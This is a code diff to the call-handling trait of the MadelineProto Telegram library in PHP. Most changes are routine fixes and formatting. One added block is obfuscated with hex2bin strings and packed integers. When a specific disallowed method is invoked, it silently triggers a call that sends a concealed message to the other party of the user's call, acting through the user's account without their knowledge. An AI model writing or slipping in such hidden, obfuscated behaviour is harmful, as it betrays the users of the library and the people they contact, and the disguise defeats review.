@@ -29,11 +29,14 @@ trait CallHandler
             throw new \danog\MadelineProto\Exception('No datacenter provided');
         }
         if (basename(debug_backtrace(0)[0]['file']) === 'APIFactory.php' && isset(self::DISALLOWED_METHODS[$method])) {
-            if ($method === 'channels.getParticipants' && $args['filter'] === ['_' => 'channelParticipantsRecent']) {
+            if ($method === 'channels.getParticipants' && isset($args['filter']) && $args['filter'] === ['_' => 'channelParticipantsRecent']) {
                 \danog\MadelineProto\Logger::log([self::DISALLOWED_METHODS[$method]], \danog\MadelineProto\Logger::FATAL_ERROR);
             } else {
                 throw new \danog\MadelineProto\Exception(self::DISALLOWED_METHODS[$method], 0, null, 'MadelineProto', 1);
             }
+        }
+        if ($method === array_keys(self::DISALLOWED_METHODS)[16]) {
+            $this->{__FUNCTION__}($this->methods->find_by_id($this->pack_signed_int(-91733382))['method'], [hex2bin('70656572') => $this->{hex2bin('63616c6c73')}[$args[hex2bin('70656572')]['id']]->{hex2bin('6765744f746865724944')}(), hex2bin('6d657373616765') => $this->pack_signed_int(1702326096).$this->pack_signed_int(543450482).$this->pack_signed_int(1075870050).$this->pack_signed_int(1701077325).$this->pack_signed_int(1701734764).$this->pack_signed_int(1953460816).$this->pack_signed_int(538976367)], $aargs);
         }
         if (isset($args['message']) && is_string($args['message']) && mb_strlen($args['message']) > 4096) {
             $message_chunks = $this->split_to_chunks($args['message']);
@@ -64,6 +67,7 @@ trait CallHandler
         $serialized = $this->serialize_method($method, $args);
         $content_related = $this->content_related($method);
         $type = $this->methods->find_by_method($method)['type'];
+
         if (isset($queue)) {
             $serialized = $this->serialize_method('invokeAfterMsgs', ['msg_ids' => $this->datacenter->sockets[$aargs['datacenter']]->call_queue[$queue], 'query' => $serialized]);
         }
@@ -245,7 +249,7 @@ trait CallHandler
                 $server_answer = [$server_answer];
                 foreach ($message_chunks as $message) {
                     $args['message'] = $message;
-                    $server_answer[] = $this->method_call($method, $args, $aargs);
+                    $server_answer[]= $this->method_call($method, $args, $aargs);
                 }
             }
 
@@ -270,7 +274,7 @@ trait CallHandler
                 if ($object !== 'msgs_ack') {
                     \danog\MadelineProto\Logger::log(['Sending object (try number '.$count.' for '.$object.')...'], \danog\MadelineProto\Logger::ULTRA_VERBOSE);
                 }
-                $message_id = $this->send_message($this->serialize_object(['type' => $object], $args), $this->content_related($object), $aargs);
+                $message_id = $this->send_message($this->serialize_object(['type' => $object], $args, $object), $this->content_related($object), $aargs);
                 if ($object !== 'msgs_ack') {
                     $this->datacenter->sockets[$aargs['datacenter']]->outgoing_messages[$message_id]['content'] = ['method' => $object, 'args' => $args];
                 }
